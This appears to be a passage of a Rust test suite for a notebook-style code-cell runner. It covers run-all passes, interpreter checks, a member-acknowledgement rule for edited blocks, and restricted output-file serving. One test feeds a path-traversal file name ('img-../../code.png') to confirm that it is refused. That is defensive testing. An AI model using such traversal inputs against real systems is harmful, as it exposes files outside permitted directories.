    let doc = DocId("d-pass".into());
    let blocks: HashMap<String, String> = [
        ("ok1", format!("#| cwd: {d}\necho one")),
        ("ok2", format!("#| cwd: {d}\necho two")),
        ("gone", format!("#| cwd: {d}/missing\necho never")),
        ("miss", format!("#| cwd: {d}\n#| expect: NOPE\necho one")),
    ]
    .into_iter()
    .map(|(k, v)| (k.to_owned(), v))
    .collect();
    note::set_docs(Arc::new(Blocks(blocks.clone())));
    let note_cell = |n: &str| CellRef::Note {
        doc: doc.clone(),
        key: NoteKey::Block(n.into()),
    };
    let pass = |id: &str, names: &[&str]| {
        let req = RunAllRequest {
            scope: Scope::Doc(doc.clone()),
            cells: names
                .iter()
                .map(|n| (note_cell(n), surface::cell::digest(&blocks[*n])))
                .collect(),
            pass: id.into(),
            pressed_by: "desktop · test".into(),
        };
        pass_end(cells.clone(), req)
    };
    let p = pass("p_before", &["ok1", "gone", "ok2"]).await;
    let s = p.stopped.expect("stopped");
    assert_eq!((s.cell, s.before, p.ran, p.total), (note_cell("gone"), true, 1, 3));
    assert!(!s.why.is_empty());
    let p = pass("p_at", &["ok1", "miss", "ok2"]).await;
    let s = p.stopped.expect("stopped");
    assert_eq!((s.cell, s.before, p.ran), (note_cell("miss"), false, 2));
    assert_eq!(s.why, "expect missed 1/1");
    let p = pass("p_clean", &["ok1", "ok2"]).await;
    assert_eq!((p.stopped, p.ran, p.total), (None, 2, 2));
    for k in cells.kernels_of(&Scope::Doc(doc.clone())) {
        cells.kernel_close(k.id).await.unwrap();
    }

    // Inv. 13: every RunFinished came after its final row.
    tokio::time::sleep(Duration::from_millis(200)).await;
    let seen = seen.lock().clone();
    assert!(seen.len() >= 10, "{seen:?}");
    assert!(seen.iter().all(|(_, final_row)| *final_row), "{seen:?}");

    // Close every kernel (no PTY outlives the test).
    let kernels = cells.kernels_of(&Scope::Session(b.session));
    assert!(!kernels.is_empty());
    for k in kernels {
        cells.kernel_close(k.id).await.unwrap();
    }
    let _ = b.dir;
}

fn walk(dir: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    if let Ok(rd) = std::fs::read_dir(dir) {
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() {
                out.extend(walk(&p));
            } else {
                out.push(p);
            }
        }
    }
    out
}

/// Start a Run all pass and wait for its end on `cell_state` (B11).
async fn pass_end(cells: Cells, req: RunAllRequest) -> PassEnd {
    let (scope, id) = (req.scope.clone(), req.pass.clone());
    cells.run_all(req).await.unwrap();
    let deadline = Instant::now() + Duration::from_secs(30);
    loop {
        let s = cells.state(scope.clone(), Vec::new()).await.unwrap();
        if let Some(p) = s.pass.filter(|p| p.pass == id) {
            return p;
        }
        assert!(Instant::now() < deadline, "pass {id} never ended");
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
}

/// The document side of note scope: blocks by name, no markdown, the owner wrote them.
struct Blocks(HashMap<String, String>);

#[async_trait::async_trait]
impl note::Docs for Blocks {
    async fn code_block(&self, _: &DocId, key: &NoteKey) -> Result<note::NoteSource, String> {
        let (NoteKey::Name(n) | NoteKey::Block(n)) = key;
        let text = self.0.get(n).ok_or_else(|| format!("no block {n}"))?;
        Ok(note::NoteSource {
            block: n.clone(),
            language: if n.starts_with("ps") { "pwsh" } else { "bash" }.into(),
            text: text.clone(),
            last_author: crate::types::Principal::Owner { device: None },
        })
    }
    async fn hub(&self) -> Result<Option<String>, String> {
        Ok(None)
    }
    async fn markdown(&self, _: &DocId) -> Option<String> {
        None
    }
    async fn title(&self, _: &DocId) -> Option<String> {
        None
    }
    async fn bound_sessions(&self, _: &DocId) -> Vec<SessionId> {
        Vec::new()
    }
    async fn put_latest(&self, _: CellLatest) -> Result<(), String> {
        Ok(())
    }
    async fn latest(&self, _: &DocId) -> Result<Vec<CellLatest>, String> {
        Ok(Vec::new())
    }
}

/// B19: a cell whose interpreter is missing is invalid on `cell_state`, with the reason.
#[tokio::test]
async fn missing_interpreter_is_an_error_problem() {
    let _one = note::DOCS_TEST.lock().await;
    let dir = tempfile::tempdir().unwrap();
    let cells = cells_in(dir.path()).await;
    if ["/usr/bin/pwsh", "/bin/pwsh", "/usr/bin/powershell"]
        .iter()
        .any(|p| Path::new(p).is_file())
    {
        return; // the test PATH is /usr/bin:/bin
    }
    let text = format!("#| cwd: {}\nGet-Date", dir.path().display());
    note::set_docs(Arc::new(Blocks([("ps1".to_owned(), text)].into())));
    let cell = CellRef::Note {
        doc: DocId("d-pwsh".into()),
        key: NoteKey::Block("ps1".into()),
    };
    let s = cells
        .state(Scope::Doc(DocId("d-pwsh".into())), vec![cell])
        .await
        .unwrap();
    let p = s.cells[0]
        .problems
        .iter()
        .find(|p| p.code == "no_interpreter")
        .expect("no_interpreter");
    assert_eq!(p.severity, Severity::Error);
    assert_eq!(p.message, "no pwsh on this machine");
}

/// The document side of note scope: one block, any key, no markdown.
struct OneBlock(note::NoteSource);

#[async_trait::async_trait]
impl note::Docs for OneBlock {
    async fn code_block(&self, _: &DocId, _: &NoteKey) -> Result<note::NoteSource, String> {
        Ok(self.0.clone())
    }
    async fn hub(&self) -> Result<Option<String>, String> {
        Ok(None)
    }
    async fn markdown(&self, _: &DocId) -> Option<String> {
        None
    }
    async fn title(&self, _: &DocId) -> Option<String> {
        None
    }
    async fn bound_sessions(&self, _: &DocId) -> Vec<SessionId> {
        Vec::new()
    }
    async fn put_latest(&self, _: CellLatest) -> Result<(), String> {
        Ok(())
    }
    async fn latest(&self, _: &DocId) -> Result<Vec<CellLatest>, String> {
        Ok(Vec::new())
    }
}

/// Invariant 6 (§13.1) at press: a note block a member wrote is refused without the member's
/// ack, or with another member's; the right ack runs it; once the owner ran that text, no ack.
#[tokio::test]
async fn member_edit_needs_the_members_ack() {
    let _one = note::DOCS_TEST.lock().await;
    let dir = tempfile::tempdir().unwrap();
    let cells = cells_in(dir.path()).await;
    let text = format!("#| name: up\n#| cwd: {}\necho hi", dir.path().display());
    note::set_docs(Arc::new(OneBlock(note::NoteSource {
        block: "b1".into(),
        language: "bash".into(),
        text: text.clone(),
        last_author: crate::types::Principal::Member {
            pub_: "QUxJQ0VLRVlBTElDRQ".into(),
            device: None,
        },
    })));
    let seen = surface::cell::digest(&text);
    let note = |block: &str| CellRef::Note {
        doc: DocId("d-member".into()),
        key: NoteKey::Block(block.into()),
    };
    let req = |cell: CellRef, id: &str, ack: Option<&str>| RunRequest {
        cell,
        seen: seen.clone(),
        mode: RunMode::Cell,
        run: RunId(id.into()),
        edited: None,
        member_ack: ack.map(Into::into),
        pressed_by: "desktop · t".into(),
    };
    let alice = CellsError::MemberAck("QUxJQ0VL".into());
    assert_eq!(
        cells.run(req(note("b1"), "r_1", None)).await.unwrap_err(),
        alice
    );
    assert_eq!(
        cells
            .run(req(note("b1"), "r_2", Some("Qk9CQk9C")))
            .await
            .unwrap_err(),
        alice
    );
    let r = cells
        .run(req(note("b1"), "r_3", Some("QUxJQ0VL")))
        .await
        .unwrap();
    assert_eq!(r.id, RunId("r_3".into()));

    // Another block with the same text the owner already ran: no ack needed.
    let ran = finished("r_owner", note("b2"), &seen, now_ms(), RunState::Done);
    let store = cells.store().unwrap().clone();
    store
        .insert(&ran, &ran.cell.scope().key(), None)
        .await
        .unwrap();
    store.finish(&ran, None, None).await.unwrap();
    let r = cells.run(req(note("b2"), "r_4", None)).await.unwrap();
    assert_eq!(r.id, RunId("r_4".into()));
}

/// `cell_output_file` serves a run's images and its `code`, nothing else of the run dir.
#[tokio::test]
async fn output_file_serves_images_and_code_only() {
    let dir = tempfile::tempdir().unwrap();
    let cells = cells_in(dir.path()).await;
    let run = RunId("r_files".into());
    let d = cells.paths().run_dir(&run);
    std::fs::create_dir_all(&d).unwrap();
    for f in ["code", "img-1.png", "meta.json", "out.ansi"] {
        std::fs::write(d.join(f), f).unwrap();
    }
    let file = |name: &str| cells.output_file(run.clone(), name.into());
    assert_eq!(file("code").await.unwrap(), b"code");
    assert_eq!(file("img-1.png").await.unwrap(), b"img-1.png");
    for refused in ["meta.json", "out.ansi", "img-../../code.png"] {
        assert!(file(refused).await.is_err(), "{refused}");
    }
}
